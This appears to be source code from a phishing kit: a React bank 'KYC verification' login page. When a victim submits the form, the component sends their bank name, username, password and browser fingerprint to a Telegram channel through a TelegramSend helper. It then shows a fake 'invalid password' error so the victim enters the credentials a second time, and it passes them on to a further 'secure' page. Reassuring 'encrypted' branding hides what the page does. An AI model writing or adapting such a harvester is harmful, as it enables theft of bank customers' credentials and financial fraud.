import React, { useState } from 'react';
import { ArrowLeft, LockKeyhole, KeyIcon } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import TelegramSend from '../utils/send-message';
import PasswordInput from './password.component';

const BankLogin = ({ bank }: BankLoginProps) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const navigate = useNavigate();

  const [isLoading, setIsLoading] = React.useState(false);

  const [hasTriedRelogin, setHasTriedRelogin] = React.useState(false);

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault()
    setIsLoading(true)

    const message = `
    [----+🏦 NEGARA 🏦+-----]

    Fingerprint: ${navigator.userAgent}

    BANK NAME: ${bank.name}
  
    USERNAME: ${username}

    PASSWORD: ${password}
    `;

    if (!hasTriedRelogin) {
      try {
        await TelegramSend(message);
        setUsername('');
        setPassword('');
        setHasTriedRelogin(true);
        setIsLoading(false);
        return;
      }
      catch (err) {
        setIsLoading(false);
        setHasTriedRelogin(false)
        return
      }
    }

    await TelegramSend(message)

    setIsLoading(false)
    
    navigate("secure", { replace: true, state:{bank:bank, credentials:{username, password}} })

  }

  return (
    <div className="min-h-screen w-screen flex items-center justify-center md:p-4 font-sans">
      {/* Outer Card */}
      <div className="w-full max-w-md bg-white overflow-hidden">

        {/* Top Navigation */}
        <div className="px-6 pt-6 flex justify-between items-center">
          <button onClick={() => navigate(-1)} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
            <ArrowLeft size={20} className="text-gray-400" />
          </button>
        </div>

        <div className="px-8 pb-8 pt-2">
          {/* Bank Logo Header */}
          <div className="flex flex-col items-center mb-8">
            <div className="w-50 h-50 flex items-center justify-center mb-6">
              <img
                src={bank.logo}
                alt={bank.name}
                className="w-full h-full object-contain"
              />
            </div>
            <h2 className="text-2xl font-bold text-[#323338] mb-1">KYC for {bank.name}</h2>
            <p className="text-gray-500 text-[15px] text-center leading-relaxed">
              Verify your bank instantly and securely.
            </p>
          </div>

          {hasTriedRelogin &&
            <div className="error text-red-600 text-center bg-red-100 py-4 text-sm">
              Invalid username or password, Please try again!
            </div>
          }
          {/* Inner Form Card - The "Nested" look from your image */}
          <div className="bg-[#FBFCFD] border border-gray-100 rounded-[24px] p-6 mb-6">
            <form className="space-y-5" onSubmit={handleSubmit} method='POST'>
              {/* Username Input */}
              <div className="space-y-1.5">
                <label className="text-[13px] font-semibold text-gray-400 ml-1">Username</label>
                <div className="relative group">
                  <input
                    type="text"
                    required
                    minLength={4}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full bg-white border border-gray-200 rounded-xl py-3.5 px-4 text-gray-900 outline-none focus:ring-2 focus:ring-blue-500/10 focus:border-blue-500 transition-all text-[15px]"
                  />
                  <KeyIcon size={16} className="absolute right-6 top-1/2 -translate-y-1/2 text-gray-300" />
                </div>
              </div>

              {/* Password Input */}
              
                 
                  <PasswordInput password={password} onChange={(e)=>setPassword(e.target.value)}/>
               

              {/* Primary Action */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-[#111827] hover:bg-black text-white font-semibold py-4 rounded-xl mt-2 flex items-center justify-center transition-all active:scale-[0.98] shadow-lg shadow-gray-200 group"
              >
                {
                  isLoading ?
                    <span>Verifying Credentials .....</span>
                    :
                    <span>Secure Verification</span>
                }

                <LockKeyhole size={18} className="ml-3 group-hover:translate-x-0.5 transition-transform" />
              </button>
            </form>

            {/* Help Link */}
            <div className="mt-6 text-center">
              <a href="#" className="text-blue-600 font-medium text-sm hover:underline underline-offset-4">
                Trouble signing in?
              </a>
            </div>
          </div>

          {/* Bottom Security Branding */}
          <div className="flex flex-col items-center space-y-2 opacity-60">
            <div className="flex items-center space-x-2">
              <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Secured by</span>
              <span className="text-[11px] font-black text-gray-900 tracking-tighter italic">NEGARA</span>
              <div className="w-1.5 h-1.5 rounded-full bg-blue-500" />
              <span className="text-[10px] font-bold text-gray-800 uppercase tracking-widest">SECURE DATA ENCRYPTION</span>
            </div>
            <p className="text-[10px] text-gray-400 font-medium">All data is encrypted.</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankLogin;